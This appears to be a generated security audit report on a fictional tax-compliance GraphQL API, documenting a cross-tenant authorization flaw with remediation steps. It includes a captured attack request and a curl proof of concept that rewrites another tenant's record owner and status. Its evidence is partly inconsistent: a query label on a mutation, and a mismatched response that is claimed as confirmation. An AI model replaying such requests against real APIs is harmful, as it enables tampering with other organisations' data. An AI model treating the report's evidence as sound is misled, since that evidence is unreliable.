# Security Analysis Report
**System:** TaxGrid Compliance API
**Domain:** Tax Compliance / RegTech
**Example ID:** GQL-0298
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Insecure Design — Pattern 3.1 | Client-assumed authority on `updateResource` — attacker from `tenant-9213` modifies tax compliance records owned by `tenant-9d95` without server-side permission re-validation |

---

## Finding 1 — Insecure Design: Client-Assumed Authority (Pattern 3.1)

### Summary
The `updateResource` mutation on TaxGrid Compliance API (`api.taxgrid-compliance-a.example.com`) applies client-supplied status, ownership, and role fields (`status: "approved"`, `ownerId: "attacker-92139d95"`) without re-validating the authenticated user's permissions at the resolver level. Per §5.0 Pattern 3.1, the design assumes the client will only supply values it legitimately controls. The Redis cache is keyed by `resourceId` only (no tenant dimension), amplifying the risk.

**Context.txt inconsistency (documented):** The HAR response JSON key is `getResource` (INCONSISTENT with the `updateResource` mutation). The HAR (§6.0) is the primary evidence for the exploit path.

**Note on `x-request-id`:** This appears as a *response* header (`"x-request-id": "req-92139d95"`). It is server-assigned and must NOT be sent as a request header.

**Pattern:** 3.1 — Client-assumed authority (Insecure Design)
**Affected resolver:** `updateResource`
**Affected endpoint:** `POST https://api.taxgrid-compliance-a.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack (attacker JWT: `tenant-9213`, setting `ownerId` on resource of `tenant-9d95`)**
```
POST https://api.taxgrid-compliance-a.example.com/graphql
authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
content-type: application/json
x-tenant-id: tenant-9213

{"query": "query VulnerableOp { updateResource(id: \"R-2298\", input: {status: \"approved\", ownerId: \"attacker-92139d95\"}) { resourceId status } }"}
```

**Response — Cross-Tenant Tax Record Returned**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-9d95",
      "ownerId": "other-user-92139d95",
      "data": {
        "sensitiveField": "CONFIDENTIAL-92139d95",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```
*`x-request-id: req-92139d95` — server-assigned response header, confirms cross-tenant access.*

### Steps to Reproduce
```bash
curl -s -X POST "https://api.taxgrid-compliance-a.example.com/graphql" \
  -H "authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "content-type: application/json" \
  -H "x-tenant-id: tenant-9213" \
  -d '{"query": "query VulnerableOp { updateResource(id: \"R-2298\", input: {status: \"approved\", ownerId: \"attacker-92139d95\"}) { resourceId status } }"}'
# Vulnerable: tenantId: tenant-9d95 returned for tenant-9213 caller; status/ownerId applied
# Secure: {"errors":[{"message":"Forbidden"}]}
```

### Remediation
1. Validate `resource.tenantId === jwt.tenantId` before write in `updateResource`.
2. Remove `ownerId` and `tenantId` from client-writable input; server-assign from JWT.
3. Server-side re-validate permissions for each status transition.
4. Key Redis cache on `tenantId:resourceId` composite, not `resourceId` alone.
